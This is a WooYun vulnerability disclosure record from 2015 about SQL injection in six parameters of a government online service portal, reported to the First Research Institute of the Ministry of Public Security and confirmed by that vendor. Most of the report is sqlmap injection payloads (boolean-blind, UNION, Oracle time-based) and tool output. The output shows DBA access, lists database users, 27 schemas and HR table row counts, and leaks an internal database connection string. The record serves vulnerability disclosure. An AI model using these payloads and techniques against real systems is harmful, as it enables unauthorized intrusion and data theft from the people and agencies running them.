{"id": 84058, "wybug_id": "wooyun-2015-0145934", "wybug_title": "某敏感部门网上办事大厅另一端口多个参数存在SQL注入（DBA权限+涉及27个数据库+大量数据可泄露）之三", "wybug_corp": "公安部一所", "wybug_author": "路人甲", "wybug_date": "2015-10-11 14:09", "wybug_open_date": "2015-11-28 11:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(公安部一所)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向公众公开  简要描述： 另外一端口，多个多处存在SQL注入，DBA权限，27个数据库。IP地址请帮忙打码，另外如有敏感信息，请管理员帮忙打码！这次测试了六个，有些参数跟之前提交过的是同一个，但是在不同的地方，测试得到的type也有一些差异，不多解释，你们懂的。 详细说明：  注入点一：\n**.**.**.**:8000/self/xzList.jsp?sid=4028811932a87caf0132a89ac07f0010\n该处的sid也存在注入\nPlace: GETParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 5409=5409 AND 'CEQy'='CEQy    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: sid=4028811932a87caf0132a89ac07f0010' UNION ALL SELECT NULL,CHR(113)||CHR(105)||CHR(114)||CHR(120)||CHR(113)||CHR(113)||CHR(101)||CHR(73)||CHR(98)||CHR(97)||CHR(88)||CHR(86)||CHR(122)||CHR(110)||CHR(102)||CHR(113)||CHR(114)||CHR(120)||CHR(103)||CHR(113) FROM DUAL--    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 1846=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(99)||CHR(81)||CHR(87),5) AND 'PObA'='PObA---[00:53:47] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[00:53:47] [INFO] fetching current usercurrent user:    'NOTA'[00:53:47] [INFO] fetching current database[00:53:47] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'NOTA'[00:53:47] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n\ndatabase management system users [37]:[*] ANONYMOUS[*] BI[*] CGS[*] CTXSYS[*] DBORACLE[*] DBSNMP[*] DIP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] MDDATA[*] MDSYS[*] MGMT_VIEW[*] NOTA[*] NOTA_TEMP[*] NOTADT[*] OE[*] OLAPSYS[*] ORDPLUGINS[*] ORDSYS[*] OTATARGET[*] OUTLN[*] PM[*] QS_ERP[*] SCOTT[*] SH[*] SI_INFORMTN_SCHEMA[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WEBOTA[*] WEBOTABASE[*] WMSYS[*] WSPCS[*] XDB\n\navailable databases [27]:[*] CGS[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] MDSYS[*] NOTA[*] NOTA_TEMP[*] NOTADT[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WEBOTA[*] WEBOTABASE[*] WMSYS[*] WSPCS[*] XDB\n\nDatabase: HR+-------------+---------+| Table       | Entries |+-------------+---------+| EMPLOYEES   | 107     || DEPARTMENTS | 27      || COUNTRIES   | 25      || LOCATIONS   | 23      || JOBS        | 19      || JOB_HISTORY | 10      || REGIONS     | 4       |+-------------+---------+\n\n\n\n\n\n\n\n\n\n\n数据信息量很大，就不继续了！测试其他地方的参数吧！~~~注入点二：\n**.**.**.**:8000/self/xz.jsp?sid=4028811932a87caf0132a89ac07f0010\n这个页面的sid也存在注入跟上面注入的少了一个type\nGET parameter 'sid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 37 HTTP(s) requests:---Place: GETParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 8445=8445 AND 'fwSz'='fwSz    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 7617=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(68)||CHR(99)||CHR(120),5) AND 'DkvG'='DkvG---[01:10:34] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[01:10:34] [INFO] fetching current user[01:10:34] [INFO] retrieving the length of query output[01:10:34] [INFO] retrieved: 4[01:10:36] [INFO] retrieved: NOTAcurrent user:    'NOTA'[01:10:36] [INFO] fetching current database[01:10:36] [INFO] retrieving the length of query output[01:10:36] [INFO] resumed: 4[01:10:36] [INFO] resumed: NOTA[01:10:36] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'NOTA'[01:10:36] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n注入点三：\n**.**.**.**:8000/self/projectinfo.jsp?sid=4028811932a87caf0132a89ac07f0010\n此页面的sid也存在注入\nGET parameter 'sid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 23 HTTP(s) requests:---Place: GETParameter: sid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 2155=2155 AND 'aONo'='aONo    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: sid=4028811932a87caf0132a89ac07f0010' AND 2996=DBMS_PIPE.RECEIVE_MESSAGE(CHR(119)||CHR(117)||CHR(69)||CHR(80),5) AND 'RtFc'='RtFc---[01:12:56] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[01:12:56] [INFO] fetching current user[01:12:56] [INFO] retrieving the length of query output[01:12:56] [INFO] retrieved: 4[01:12:59] [INFO] retrieved: NOTAcurrent user:    'NOTA'[01:12:59] [INFO] fetching current database[01:12:59] [INFO] retrieving the length of query output[01:12:59] [INFO] resumed: 4[01:12:59] [INFO] resumed: NOTA[01:12:59] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'NOTA'[01:12:59] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n注入点四：\n**.**.**.**:8000/self/addWssb.jsp?keyid=PJ201411141324100375\nkeyid存在注入\nGET parameter 'keyid' is vulnerable. Do you want to keep testing the others (ifany)? [y/N] ysqlmap identified the following injection points with a total of 29 HTTP(s) requests:---Place: GETParameter: keyid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyid=PJ201411141324100375' AND 7033=7033 AND 'fABa'='fABa    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: keyid=PJ201411141324100375' AND 7251=DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(100)||CHR(77)||CHR(100),5) AND 'ydIE'='ydIE---[01:29:18] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[01:29:18] [INFO] fetching current user[01:29:18] [INFO] retrieving the length of query output[01:29:18] [INFO] retrieved: 4[01:29:23] [INFO] retrieved: NOTAcurrent user:    'NOTA'[01:29:23] [INFO] fetching current database[01:29:23] [INFO] retrieving the length of query output[01:29:23] [INFO] resumed: 4[01:29:23] [INFO] resumed: NOTA[01:29:23] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'NOTA'[01:29:23] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n注入点五\n**.**.**.**:8000/self/fckEditPage.jsp?docId=TB201112241456590953&mat=1\ndocId存在盲注\nsqlmap identified the following injection points with a total of 145 HTTP(s) requests:---Place: GETParameter: docId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: docId=TB201112241456590953' AND 1377=1377 AND 'SVwx'='SVwx&mat=1---[01:43:55] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[01:43:55] [INFO] fetching current user[01:43:55] [INFO] retrieving the length of query output[01:43:55] [INFO] retrieved: 4[01:44:07] [INFO] retrieved: NOTAcurrent user:    'NOTA'[01:44:07] [INFO] fetching current database[01:44:07] [INFO] retrieving the length of query output[01:44:07] [INFO] resumed: 4[01:44:07] [INFO] resumed: NOTA[01:44:07] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'NOTA'[01:44:07] [INFO] testing if current user is DBAcurrent user is DBA:    True\n\n\n注入点六\n**.**.**.**:8000/list.jsp?flag=治安&tn=2&pn=3&xiangmu=1\nflag存在注入，但是获取的信息有问题，估计的绕过才行，就不进行绕过了~~~还是连接数据库时出现问题？测试完后访问**.**.**.**:8000/list.jsp?flag=禁毒</code>返回错误信息，得到内网IP，数据库地址。\nOTA DB init error:从数据源建立数据库连接时出错：Listener refused the connection with the following error: ORA-12519, TNS:no appropriate service handler found The Connection descriptor used by the client was: **.**.**.**:1521:orcl\n\nsqlmap identified the following injection points with a total of 335 HTTP(s) requests:---Place: GETParameter: flag    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: flag=??') AND 7500=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(112)||CHR(113)||CHR(74),5) AND ('DxMV'='DxMV&tn=2&pn=3&xiangmu=1---[01:53:51] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[01:53:51] [INFO] fetching current user[01:53:51] [WARNING] multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically[01:53:51] [INFO] retrieved:[01:53:51] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[01:53:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'current user:   None[01:53:51] [INFO] fetching current database[01:53:51] [INFO] retrieved:[01:53:52] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):      None[01:53:52] [INFO] testing if current user is DBAcurrent user is DBA:    False\n\n\n该端口的参数基本测试了完了，剩下的再找找看有时间，或者部分参数看似不能注入的能否增加级别或者绕过注入了！~~~   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  过滤权限限制   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-10-14 11:35 厂商回复： 感谢提交！！验证确认所描述的问题，已通知其修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}